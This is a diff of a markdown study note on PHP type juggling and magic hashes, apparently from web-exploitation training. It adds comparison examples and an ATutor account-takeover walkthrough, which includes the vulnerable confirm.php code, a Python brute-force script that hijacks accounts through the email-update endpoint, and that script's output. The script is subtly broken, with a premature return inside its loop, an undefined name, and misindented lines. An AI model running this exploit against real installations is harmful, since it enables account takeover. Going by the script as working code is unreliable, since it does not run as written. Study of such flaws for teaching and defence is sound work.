@@ -2,11 +2,32 @@
 >**PHP does not require (or support) explicit type definition in variable declaration**; a variable's type is determined by the context in which the variable is used. 
 >That is to say, if a string value is assigned to variable `$var`, `$var` becomes a string. If an int value is then assigned to `$var`, it becomes an int.
 
+>[!warning]
+>PHP8 is no longer vulnerable!
+
 ![|700](../../zzz_res/attachments/Pasted%20image%2020221210135017.png)
 
 ![|700](../../zzz_res/attachments/Pasted%20image%2020221210135040.png)
 
-# Examples
+# Loose comparison examples
+
+```php
+php > var_dump('0xAAAA' == '43690');
+bool(false)
+php > var_dump('0xAAAA' == 43690);
+bool(false)
+php > var_dump(0xAAAA == 43690);
+bool(true)
+php > var_dump('0xAAAA' == '43691');
+bool(false)
+
+php > var_dump('0eAAAA' == '0');
+bool(false)
+php > var_dump('0e1111' == '0');
+bool(true)
+php > var_dump('0e9999' == 0);
+bool(true)
+```
 
 During the comparison of variables of **different types**, PHP will first **convert them to a common**, comparable type.
 
@@ -40,9 +61,28 @@ if ("Puppies" == 0) {
 
 Also in this case the comparison returns *True* because the string is converted to a 0 in order to be compared with a number.
 
+## Magic Hashes
+
+>[!info]
+>Further information on [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)
+
+The hexadecimal character space used for the representation of various hash types is **a-fA-F0-9**. 
+This implies that it may be possible to discover a plain-text value whose MD5 hash conforms to the format of scientific exponent notation. In the case of MD5, that is indeed true and the specific string was discovered by Michal Spacek.
+
+```php
+student@atutor:~$ php -a
+Interactive mode enabled
+php > echo md5('240610708');
+0e462097431906509019562988736854
+php > var_dump('0e462097431906509019562988736854' == '0');
+bool(true)
+```
+
+The MD5 of this particular string translates to a valid number formatted in the [scientific exponential notation](https://www.php.net/manual/en/language.types.float.php), and its value evaluates to zero.
+
 # Exploitation
 
-## Authentication bypass
+## Classic authentication bypass
 
 ```php
 if ($_POST["password"] == "Admin_Password") {login_as_admin();}
@@ -88,25 +128,88 @@ Connection: close
 ],"":""}
 ```
 
+## Authentication bypass exploiting business logic flaws and type juggling
 
-## Magic Hashes
+ATutor was vulnerable to an authentication bypass and account takeover vulnerability caused by a [flawed business logic](Business%20logic%20vulnerabilities.md) affected by a type juggling vulnerability ^[adv].
 
->[!info]
->Further information on [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)
+[^adv]: https://srcincite.io/advisories/src-2016-0012/
 
-The hexadecimal character space used for the representation of various hash types is **a-fA-F0-9**. 
-This implies that it may be possible to discover a plain-text value whose MD5 hash conforms to the format of scientific exponent notation. In the case of MD5, that is indeed true and the specific string was discovered by Michal Spacek.
+The *confirm.php* file updates user's email, but it can be invoked without authentication. Because of the type juggling vulnerability, it can be use to takeover any account.
 
+*confirm.php*
 ```php
-student@atutor:~$ php -a
-Interactive mode enabled
-php > echo md5('240610708');
-0e462097431906509019562988736854
-php > var_dump('0e462097431906509019562988736854' == '0');
-bool(true)
+if (isset($_GET['e'], $_GET['id'], $_GET['m'])) {
+	$id = intval($_GET['id']); // user id
+	$m = $_GET['m']; // ad-hoc value
+	$e = $addslashes($_GET['e']); // email
+
+	$sql = "SELECT creation_date FROM %smembers WHERE member_id=%d";
+	$row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE);
+
+	if ($row['creation_date'] != '') {
+		$code = substr(md5($e . $row['creation_date'] . $id), 0, 10); // $code can be partially controlled, but we must bruteforce it playing around with the $e parameter. We must obtain a value similar to 0e123456
+		if ($code == $m) { // type juggling
+			$sql = "UPDATE %smembers SET email='%s', last_login=NOW(), creation_date=creation_date WHERE member_id=%d";
+			$result = queryDB($sql, array(TABLE_PREFIX, $e, $id)); // email updated and account takeover can be achieved requesting a new password
+			...
 ```
 
-The MD5 of this particular string (listing 148) translates to a valid number formatted in the [scientific exponential notation](https://www.php.net/manual/en/language.types.float.php), and its value evaluates to zero.
+Brute-force script used to find a valid email address allowing to exploit the vulnerability:
+```python
+import hashlib, string, itertools, re, sys, requests
+
+def update_email(ip, domain, id, prefix_length):
+	count = 0
+	for word in itertools.imap(''.join, itertools.product(string.lowercase, repeat=int(prefix_length))):
+		email = "%s@%s" % (word, domain)
+		url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
+		print "(*) Issuing update request to URL: %s" % url
+		r = requests.get(url, allow_redirects=False)
+		if (r.status_code == 302):
+			return (True, email, count)
+		else:
+			count += 1
+		return (False, Nothing, count)
+
+def main():
+	if len(sys.argv) != 5:
+		print '(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>' % sys.argv[0]
+		print '(+) eg: %s offsec.local 1 3 192.168.1.2' % sys.argv[0]
+		sys.exit(-1)
+	domain = sys.argv[1]
+	id = sys.argv[2]
+	prefix_length = sys.argv[3]
+	ip = sys.argv[4]
+
+	result, email, c = update_email(ip, domain, id, prefix_length)
+		if(result):
+			print "(+) Account hijacked with email %s using %d requests!" % (email, c)
+		else:
+			print "(-) Account hijacking failed!"
+if __name__ == "__main__":
+	main()
+```
+```bash
+$ python atutor_update_email.py offsec.local 1 3 192.168.2.225
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=aaa@offsec.local&m=0&id=1
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=aab@offsec.local&m=0&id=1
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=aac@offsec.local&m=0&id=1
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=aad@offsec.local&m=0&id=1
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=aae@offsec.local&m=0&id=1
+...
+...
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=axs@offsec.local&m=0&id=1
+(*) Issuing update request to URL:
+http://192.168.2.225/ATutor/confirm.php?e=axt@offsec.local&m=0&id=1
+(+) Account hijacked with email axt@offsec.local using 617 requests! # (+) md5('axt@offsec.local'.$row['creation_date']) similar to 00e5718309 and can be used to bypass the loose comparison
+```
+
 
 # Remediation
 
